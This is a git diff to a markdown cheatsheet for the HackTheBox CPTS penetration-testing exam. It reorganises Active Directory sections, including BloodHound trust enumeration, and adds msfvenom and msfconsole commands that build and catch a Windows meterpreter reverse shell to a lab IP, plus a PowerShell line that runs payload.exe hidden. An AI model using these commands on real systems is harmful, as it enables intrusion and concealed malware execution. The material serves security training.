@@ -79,15 +79,15 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [ACL Enumeration & Tactics](#acl-enumeration-and-tactics)
     - [DCSync Attack](#dcsync-attack)
     - [Privileged Access](#Privileged-Access)
-    - [Kerberos "Double Hop" Problem](#Kerberos-"Double-Hop"-Problem)
+    - [Kerberos "Double Hop" Problem](#Kerberos-Double-Hop-Problem)
     - [Bleeding Edge Vulnerabilities](#Bleeding-Edge-Vulnerabilities)
     - [Miscellanous Configurations](#miscellanous-configurations)
     - [ASREPRoasting](#asreproasting)
-    - [Group Policy Object (GPO) Abuse](#Group-Policy-Object-(GPO)-Abuse)
+    - [Group Policy Object (GPO) Abuse](#Group-Policy-Object-Abuse)
     - [Domain Trusts Primer](#Domain-Trusts-Primer)
-    - [BloodHound: Domain Trusts & Cross-Forest Analysis](#BloodHound:-Domain-Trusts-and-Cross-Forest-Analysis)
     - [Trust Relationships Child-Parent Trusts](#trust-relationships-child-parent-trusts)
     - [Trust Relationships Cross-Forest Trust](#Trust-Relationships-Cross-Forest-Trust)
+    - [BloodHound: Domain Trusts & Cross-Forest Analysis](#BloodHound-to-enum-Domain-Trusts-and-Cross-Forest-Analysis)
     - [AD Auditing Toolkit](#AD-Auditing-Toolkit)
 - [Login Brute Forcing](#login-brute-forcing)
     - [Hydra](#hydra)
@@ -103,9 +103,13 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 - [Metasploit](#Metasploit)
 - [smbclient](#smbclient)
 - [gobuster](#gobuster)
-- [Step to privilege escalation in AD](#Step-to-escal)
+- [whatweb](#whatweb)
 - [useful command](#useful-command)
-- 
+- [Step to privilege escalation in AD](#Step-to-escal)
+- [Useful Script To Local Windows Privilege Escalation](#Useful-Script-To-Local-Windows-Privilege-Escalation)
+- [Useful Resources To Local Windows Privilege Escalation](#Useful-Resources-To-Local-Windows-Privilege-Escalation)
+- [Useful Script To Linux Privilege Escalation](#Useful-Script-To-Linux-Privilege-Escalation)
+- [Useful Resources To Linux Privilege Escalation](#Useful-Resources-To-Linux-Privilege-Escalation)
 - [Useful Resources](#useful-resources)
 
 
@@ -2002,7 +2006,7 @@ Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\dam
 # Impacket tool used to connect to a MSSQL server from a Linux-based host.
 mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
 ```
-##### Kerberos "Double Hop" Problem
+##### Kerberos Double Hop Problem
 ```
 # --- [ ERROR STATE IDENTIFICATION ] ---
 # When connected via standard WinRM (Network Logon), check for cached tickets:
@@ -2236,7 +2240,7 @@ enumdomusers
 GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
 
 ```
-##### Group Policy Object (GPO) Abuse 
+##### Group Policy Object Abuse 
 ```
 ________________________________________________________________________________________
 (https://github.com/FSecureLABS/SharpGPOAbuse)
@@ -2322,54 +2326,6 @@ ____________________________________________
 # - SID Filtering: A security mechanism (NOT a trust type) that prevents SID History Abuse by filtering out SIDs not belonging to the trusted domain.
 # - Transitivity: Determines if the trust "hops" to other domains (Transitive = Shared; Non-transitive = Direct only).
 # - Selective Authentication: Restricts access to specific servers/users instead of the entire domain.
-```
-##### BloodHound: Domain Trusts and Cross-Forest Analysis
-```
-____________________________________________
-(Data Collection - The First Step)
-____________________________________________
-
-# 1. Collect all data (including Trusts, Group Memberships, and ACLs).
-.\SharpHound.exe -c All --ZipFileName loot.zip
-
-# 2. Collect from a specific domain (if you have a foothold in a child domain).
-.\SharpHound.exe -d logistics.inlanefreight.local -c All
-
-____________________________________________
-(Standard Queries - Visualizing the Bridge)
-____________________________________________
-
-# 1. Map Domain Trusts: Right-click on any Domain Node -> "Map Domain Trusts".
-#    - Red Line: Indicates a trust relationship.
-#    - Direction: Arrows point TOWARDS the Trusting domain (Who provides resources).
-
-# 2. Find Foreign Group Members: Analysis Tab -> "Find Foreign Group Members".
-#    - Purpose: Finds users from Domain B who are in sensitive groups of Domain A.
-#    - Red Team Insight: These are your "entry points" into the target domain.
-
-# 3. Shortest Paths to Domain Admins: Analysis Tab -> "Shortest Paths to Domain Admins".
-#    - Look for paths that cross the red "TrustedBy" edges.
-
-____________________________________________
-(Custom Cypher Queries - Pro Level)
-____________________________________________
-
-# 1. List all Domain Trusts with Directions and Attributes:
-MATCH p=(n:Domain)-[:TrustedBy]->(m:Domain) RETURN p
-
-# 2. Find all users from other domains in the local "Domain Admins" group:
-MATCH (n:User)-[:MemberOf*1..]->(g:Group) 
-WHERE g.name STARTS WITH 'DOMAIN ADMINS' AND n.domain <> g.domain 
-RETURN n.name, g.name
-
-____________________________________________
-(Key Edges & Attack Vectors)
-____________________________________________
-
-# - [TrustedBy]: The core trust edge. Check properties for "IsTransitive" and "SidFilteringEnabled".
-# - [MemberOf] (Cross-domain): A user from Domain A has rights in Domain B.
-# - [AllowedToDelegate]: Can be abused for Constrained Delegation across trust boundaries.
-# - [Enterprise Admin]: Always the ultimate target in a Forest Root domain.
 ```
 ##### Trust Relationships Child-Parent Trusts 
 ```
@@ -2559,6 +2515,54 @@ ________________________________________________________________________________
 
 # 4. Critical Pre-requisite: 
 #    Your attack host must be able to reach the IP of the Home DC once the Target DC provides the referral. Ping check to both DCs is mandatory.
+```
+##### BloodHound to enum Domain Trusts and Cross-Forest Analysis
+```
+____________________________________________
+(Data Collection - The First Step)
+____________________________________________
+
+# 1. Collect all data (including Trusts, Group Memberships, and ACLs).
+.\SharpHound.exe -c All --ZipFileName loot.zip
+
+# 2. Collect from a specific domain (if you have a foothold in a child domain).
+.\SharpHound.exe -d logistics.inlanefreight.local -c All
+
+____________________________________________
+(Standard Queries - Visualizing the Bridge)
+____________________________________________
+
+# 1. Map Domain Trusts: Right-click on any Domain Node -> "Map Domain Trusts".
+#    - Red Line: Indicates a trust relationship.
+#    - Direction: Arrows point TOWARDS the Trusting domain (Who provides resources).
+
+# 2. Find Foreign Group Members: Analysis Tab -> "Find Foreign Group Members".
+#    - Purpose: Finds users from Domain B who are in sensitive groups of Domain A.
+#    - Red Team Insight: These are your "entry points" into the target domain.
+
+# 3. Shortest Paths to Domain Admins: Analysis Tab -> "Shortest Paths to Domain Admins".
+#    - Look for paths that cross the red "TrustedBy" edges.
+
+____________________________________________
+(Custom Cypher Queries - Pro Level)
+____________________________________________
+
+# 1. List all Domain Trusts with Directions and Attributes:
+MATCH p=(n:Domain)-[:TrustedBy]->(m:Domain) RETURN p
+
+# 2. Find all users from other domains in the local "Domain Admins" group:
+MATCH (n:User)-[:MemberOf*1..]->(g:Group) 
+WHERE g.name STARTS WITH 'DOMAIN ADMINS' AND n.domain <> g.domain 
+RETURN n.name, g.name
+
+____________________________________________
+(Key Edges & Attack Vectors)
+____________________________________________
+
+# - [TrustedBy]: The core trust edge. Check properties for "IsTransitive" and "SidFilteringEnabled".
+# - [MemberOf] (Cross-domain): A user from Domain A has rights in Domain B.
+# - [AllowedToDelegate]: Can be abused for Constrained Delegation across trust boundaries.
+# - [Enterprise Admin]: Always the ultimate target in a Forest Root domain.
 ```
 ##### AD Auditing Toolkit
 ```
@@ -2957,6 +2961,11 @@ use auxiliary/server/socks_proxy
 
 # Metasploit command used to select the autoroute module.
 use post/multi/manage/autoroute
+
+# Metasploit command used gen revshell and run handler
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.14.163; set LPORT 4444; run"
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.163 LPORT=4444 -f exe > payload.exe
+
 ```
 ## smbclient
 
@@ -3086,7 +3095,6 @@ smbclient -U 'voleur.htb/ryan.naylor%HollowOct31Nyt' --realm=voleur.htb //dc.vol
 
 # run bloodhound  by netexec 
 netexec ldap dc01.fluffy.htb -u 'p.agila' -p 'prometheusx-303' --bloodhound --dns-server 10.10.11.42 --collection all
-Step-to-escal
 
 # test RCE
 sudo tcpdump -i tun0 icmp and not host 10.10.14.1
@@ -3097,8 +3105,11 @@ sudo nc -lvnp 443 -s 10.10.14.4
 # RDP with share drive 
 xfreerdp /u:svc_sql /p:lucky7 /v:10.129.253.79:8888 /dynamic-resolution /drive:Shared,//home/htb-ac-1224655/
 
+# Command psh to start process hiden
+Start-Process -FilePath "C:\Windows\System32\inetsrv\payload.exe" -WindowStyle Hidden
+
 ```
-## Step-to-escal
+## Step to escal
 ```
 ## 1. Constrained Delegation ( HELEN.FROST  need have GenericAll permission to machine FS01 and have SeEnableDelegationPrivilege in whoami /priv )
 
